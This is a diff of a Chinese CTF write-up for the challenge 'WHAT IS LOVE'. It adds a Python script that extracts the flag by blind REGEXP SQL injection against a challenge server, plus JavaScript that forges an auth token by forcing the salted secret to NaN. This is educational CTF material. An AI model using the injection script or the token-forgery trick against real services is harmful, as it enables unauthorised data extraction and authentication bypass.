@@ -175,7 +175,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="color: #ff7d73">
+                <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="color: #03a9f4">
                     复现
                 </a>
             </span>
@@ -186,9 +186,10 @@
     
     <div class="content" v-pre>
         <p>REGEXP注入</p>
+<p>当时没打，环境没了，复现不太动。。。</p>
 <span id="more"></span>
 
-<h1 id="WHAT-IS-LOVE"><a href="#WHAT-IS-LOVE" class="headerlink" title="WHAT IS LOVE"></a>WHAT IS LOVE</h1><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><blockquote>
+<h1 id="WHAT-IS-LOVE"><a href="#WHAT-IS-LOVE" class="headerlink" title="WHAT IS LOVE"></a>WHAT IS LOVE</h1><h2 id="关键源代码"><a href="#关键源代码" class="headerlink" title="关键源代码"></a>关键源代码</h2><blockquote>
 <p>main.js</p>
 </blockquote>
 <pre><code class="js">const express = require(&quot;express&quot;);
@@ -375,6 +376,83 @@ module.exports = &#123;
   createToken,
   decodeToken,
 &#125;;
+</code></pre>
+<h2 id="key1处sql注入"><a href="#key1处sql注入" class="headerlink" title="key1处sql注入"></a>key1处sql注入</h2><p>思路就是利用regexp注入，但是好像有长度限制，可以先用love_key regexp ^来盲注判断flag头，</p>
+<p>之后到达长度限制之后，再使用{}$盲注以”}”结尾的字符串</p>
+<p>su的脚本：</p>
+<pre><code class="py">import requests
+import urllib
+
+url = &#39;http://1.94.13.174:10088/key1&#39;
+headers = &#123;
+    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;
+&#125;
+flag = &#39;&#39;
+list=&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_ &#123;&#125;!@$%&amp;*()#.&quot;
+#&#39; || love_key REGEXP BINARY &#39;^&#123;&#125;&#39;#
+for i in range(1, 40):
+    for j in list:
+        data = &#123;
+            &quot;key1&quot;:&quot;&#39; || love_key REGEXP BINARY &#39;&#123;&#125;$&#39;#&quot;.format(j+flag)
+        &#125;
+        print(data)
+        r = requests.post(url, headers=headers, data=data)
+        if &quot;success&quot; in r.text:
+            flag = j+flag
+            print(flag)
+            break
+        if j == &#39;.&#39;:
+            print(flag)
+            exit()
+</code></pre>
+<h2 id="key2伪造token"><a href="#key2伪造token" class="headerlink" title="key2伪造token"></a>key2伪造token</h2><pre><code class="js">1.
+if (userinfo.have_lovers) &#123;
+    res.send(`your key2 is $&#123;key2&#125;`);
+  &#125; else &#123;
+    res.send(&quot;your have not lover&quot;);
+  &#125;
+2.
+if (
+    userInfo.username === my_lover.username &amp;&amp;
+    userInfo.love_time === my_lover.love_time
+  ) &#123;
+    have_lovers = true;
+  &#125;
+3.
+class My_lover &#123;
+  constructor() &#123;
+    this.username = process.env.LOVER || &quot;lover&quot;;
+    this.love_time = parseInt(process.env.LOVE_TIME, 10) || 30;
+  &#125;
+&#125;
+4.
+  let &#123; username, love_time &#125; = req.body;
+  let userInfo = &#123;&#125;;
+  userInfo.username = username;
+  userInfo.love_time = Number(love_time);
+
+ 需要让have_lovers为真，也就是需要userInfo.username === my_lover.username&amp;&amp;userInfo.love_time === my_lover.love_time;userinfo的love_time可控，这里类中的love_time会先去读环境变量再转为十进制数字，这里他的环境变量应该就是一个字符串，导致love_time是NaN，userinfo中的love_time我们传入一个字符串，同样会让Number返回NaN通过判断
+</code></pre>
+<blockquote>
+<p>token生成逻辑</p>
+</blockquote>
+<pre><code class="js">const createToken = (userinfo) =&gt; &#123;
+  const saltedSecret =
+    parseInt(Buffer.from(secret).readBigUInt64BE()) +
+    parseInt(userinfo.love_time);
+  const data = JSON.stringify(userinfo);
+  return (
+    Buffer.from(data).toString(&quot;base64&quot;) + &quot;.&quot; + hash(`$&#123;data&#125;:$&#123;saltedSecret&#125;`)
+  );
+&#125;;
+由于前一步我们令love_time为字符串，所以这里parseInt之后也会是NaN，同时任何数加上NaN都是NaN，所以saltedSecret就是NaN，密钥可控之后就可以伪造token了
+</code></pre>
+<pre><code class="js">const crypto = require(&quot;crypto&quot;);
+const hash = (data) =&gt; crypto.createHash(&quot;sha256&quot;).update(data).digest(&quot;hex&quot;);
+
+data=&quot;&#123;\&quot;username\&quot;:\&quot;lover\&quot;,\&quot;love_time\&quot;:null,\&quot;have_lovers\&quot;:true&#125;&quot;
+saltedSecret=NaN
+console.log(Buffer.from(data).toString(&quot;base64&quot;) + &quot;.&quot; + hash(`$&#123;data&#125;:$&#123;saltedSecret&#125;`))
 </code></pre>
 
     </div>
